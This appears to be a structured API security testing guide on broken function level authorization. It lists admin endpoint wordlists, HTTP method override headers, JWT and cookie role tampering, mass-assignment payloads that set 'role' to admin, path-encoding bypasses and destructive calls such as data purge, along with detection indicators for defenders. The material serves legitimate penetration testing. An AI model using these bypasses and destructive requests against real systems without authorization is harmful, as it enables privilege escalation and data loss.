<vulnerability_guide>
  <title>BROKEN FUNCTION LEVEL AUTHORIZATION (BFLA) - COMPREHENSIVE TESTING</title>

  <critical>BFLA occurs when APIs fail to properly restrict access to privileged functions based on user roles. Unlike BOLA which targets data access, BFLA targets administrative functions, role-based operations, and actions that should be restricted to specific user types. BFLA often leads to complete account takeover, privilege escalation, and system compromise.</critical>

  <scope>
    - Admin endpoint access with regular user credentials
    - Hidden API endpoints and undocumented functions
    - Role-based function bypass
    - HTTP method manipulation (GET vs POST vs PUT)
    - Parameter-based privilege escalation
    - API versioning exploits
    - Endpoint path manipulation
  </scope>

  <methodology>
    1. **Map all endpoints**: Document every API endpoint and function
    2. **Identify roles**: Understand the application's role hierarchy
    3. **Test role boundaries**: Access functions across role boundaries
    4. **Discover hidden endpoints**: Find undocumented admin functions
    5. **Test HTTP methods**: Try alternative methods on endpoints
    6. **Document function access**: Map which roles can access which functions
  </methodology>

  <advanced_techniques>
    <admin_endpoint_testing>
      Access administrative functions:
      {% raw %}
      # Common admin endpoint patterns
      /api/admin/*
      /api/v1/admin/*
      /api/internal/*
      /api/manage/*
      /api/system/*
      /api/config/*
      /api/settings/*
      /api/users/admin
      /api/dashboard/admin

      # Admin operations on regular endpoints
      POST /api/users                    # Create users (admin function)
      DELETE /api/users/{id}             # Delete users
      PUT /api/users/{id}/role           # Change roles
      GET /api/users/all                 # List all users
      GET /api/audit/logs                # View audit logs
      POST /api/config/update            # Update system config

      # Privileged query parameters
      GET /api/users?role=admin
      GET /api/reports?include_all=true
      GET /api/data?admin=true
      GET /api/export?full=true
      {% endraw %}
    </admin_endpoint_testing>

    <endpoint_discovery>
      Find hidden and undocumented endpoints:
      {% raw %}
      # Path wordlist fuzzing
      /api/debug
      /api/test
      /api/dev
      /api/swagger
      /api/docs
      /api/graphql
      /api/internal
      /api/private
      /api/hidden
      /api/backdoor
      /api/console

      # Version manipulation
      /api/v1/users      # Production
      /api/v2/users      # Beta (less restricted)
      /api/v0/users      # Legacy (no auth)
      /api/beta/users
      /api/staging/users
      /api/dev/users

      # Common admin functions
      /api/users/export
      /api/users/import
      /api/users/bulk-delete
      /api/database/backup
      /api/cache/clear
      /api/logs/download
      /api/metrics
      /api/health
      /api/status

      # Source code analysis
      # Search JS files for: /api/, fetch(, axios., $.ajax
      grep -r "api/" *.js
      grep -r "endpoint" *.js
      {% endraw %}
    </endpoint_discovery>

    <http_method_manipulation>
      Test different HTTP methods:
      {% raw %}
      # Method override
      GET /api/users/123        # Read (allowed)
      PUT /api/users/123        # Update (may be restricted)
      DELETE /api/users/123     # Delete (admin only?)
      PATCH /api/users/123      # Partial update
      POST /api/users/123       # Alternative update

      # Method override headers
      X-HTTP-Method-Override: DELETE
      X-Method-Override: PUT
      X-HTTP-Method: PATCH

      # Query parameter override
      GET /api/users/123?_method=DELETE
      POST /api/users/123?_method=PUT

      # Content-Type manipulation
      # Same endpoint, different behavior based on content type
      Content-Type: application/json
      Content-Type: application/x-www-form-urlencoded
      Content-Type: multipart/form-data

      # OPTIONS enumeration
      OPTIONS /api/users/123
      # Response reveals allowed methods
      {% endraw %}
    </http_method_manipulation>

    <role_boundary_testing>
      Test across role boundaries:
      {% raw %}
      # Role hierarchy (example)
      # guest < user < moderator < admin < superadmin

      # Functions that should be role-restricted
      # As regular user, try:
      POST /api/users/{id}/ban           # Moderator function
      POST /api/users/{id}/promote       # Admin function
      GET /api/reports/financial         # Finance role
      POST /api/deployments/trigger      # DevOps role
      GET /api/users/pii                 # Compliance role

      # Role manipulation in requests
      POST /api/action
      {"user_id": 123, "role": "admin"}

      # JWT role claims (if modifiable)
      # Decode JWT, change role, re-encode (if no signature check)
      {"role": "user"} -> {"role": "admin"}

      # Session/cookie role manipulation
      Cookie: role=admin
      Cookie: is_admin=true
      {% endraw %}
    </role_boundary_testing>

    <parameter_privilege_escalation>
      Escalate via parameter manipulation:
      {% raw %}
      # Hidden parameters
      POST /api/users
      {
        "username": "test",
        "password": "test123",
        "role": "admin",              # Hidden admin field
        "is_admin": true,             # Boolean flag
        "permissions": ["all"],       # Permission array
        "account_type": "enterprise"  # Account tier
      }

      # Mass assignment
      PUT /api/profile
      {
        "name": "Attacker",
        "email": "attacker@evil.com",
        "role": "admin",              # Shouldn't be modifiable
        "verified": true,             # Bypass verification
        "subscription": "premium"     # Free upgrade
      }

      # GraphQL mutations
      mutation {
        updateUser(id: "me", input: {
          role: ADMIN
          permissions: [READ, WRITE, DELETE, ADMIN]
        }) {
          id
          role
        }
      }
      {% endraw %}
    </parameter_privilege_escalation>

    <path_manipulation>
      Manipulate URL paths:
      {% raw %}
      # Path traversal to admin
      /api/users/../admin/users
      /api/users/..%2fadmin
      /api/users;admin/dashboard

      # Case sensitivity
      /api/Admin/users
      /api/ADMIN/users
      /api/aDmIn/users

      # URL encoding
      /api/%61dmin/users
      /api/admin%00/users
      /api/admin%20/users

      # Double URL encoding
      /api/%2561dmin/users

      # Path parameter pollution
      /api/users/123/admin/../../settings

      # Trailing characters
      /api/admin/
      /api/admin/.
      /api/admin.json
      /api/admin;.js
      {% endraw %}
    </path_manipulation>

    <api_versioning_exploitation>
      Exploit version differences:
      {% raw %}
      # Test older versions (often less secure)
      /api/v1/admin/users    # Current (secured)
      /api/v0/admin/users    # Legacy (no auth?)

      # Test newer/beta versions
      /api/v2/admin/users    # Beta (incomplete auth?)
      /api/beta/admin/users

      # Version in header
      Accept: application/vnd.api.v1+json
      API-Version: 1
      X-API-Version: 0

      # No version (default behavior)
      /api/admin/users       # May default to unprotected

      # Deprecated endpoints
      /api-old/admin
      /api-legacy/admin
      /v1/api/admin
      {% endraw %}
    </api_versioning_exploitation>

    <function_specific_testing>
      Test specific privileged functions:
      {% raw %}
      # User management
      POST /api/users/invite          # Invite users
      POST /api/users/deactivate      # Deactivate accounts
      POST /api/users/password-reset  # Force password reset
      PUT /api/users/{id}/permissions # Modify permissions

      # System operations
      POST /api/system/restart
      POST /api/cache/invalidate
      GET /api/system/info
      GET /api/debug/vars

      # Data operations
      POST /api/data/export-all
      POST /api/data/import
      DELETE /api/data/purge
      POST /api/backup/create

      # Feature toggles
      POST /api/features/enable
      PUT /api/features/{feature}/toggle
      {% endraw %}
    </function_specific_testing>
  </advanced_techniques>

  <validation>
    - Access at least one admin function with regular user
    - Discover undocumented endpoints not intended for user access
    - Escalate privileges through parameter manipulation
    - Execute privileged operations across role boundaries
    - Document function access matrix (role vs. function)
  </validation>

  <false_positives>
    - Functions intentionally available to all users
    - Demo/sandbox endpoints for testing
    - Public documentation endpoints
    - Health check endpoints intended to be open
  </false_positives>

  <detection_indicators>
    - Access to /admin/, /internal/, /manage/ paths by non-admin
    - HTTP method usage inconsistent with user role
    - Parameter injection attempts (role, is_admin, etc.)
    - API version switching patterns
    - Path manipulation attempts
  </detection_indicators>

  <pro_tips>
    - API documentation often lists endpoints without showing auth requirements
    - Mobile app reverse engineering reveals hidden admin endpoints
    - JS source maps expose internal API structure
    - Error messages may reveal existence of admin functions
    - GraphQL introspection shows all available mutations
    - Older API versions often lack newer security controls
    - OPTIONS requests may bypass auth checks
    - Admin functions may exist but return 403 - keep testing for bypasses
  </pro_tips>

  <remember>BFLA is about accessing functions, not data. A user shouldn't be able to call DELETE /api/users even if they could somehow guess valid user IDs. Every privileged function needs explicit role verification.</remember>
</vulnerability_guide>
